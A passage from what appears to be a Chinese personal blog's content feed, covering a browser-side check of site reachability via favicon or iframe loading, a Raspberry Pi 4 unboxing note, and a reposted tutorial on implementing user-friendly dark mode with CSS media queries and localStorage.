检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 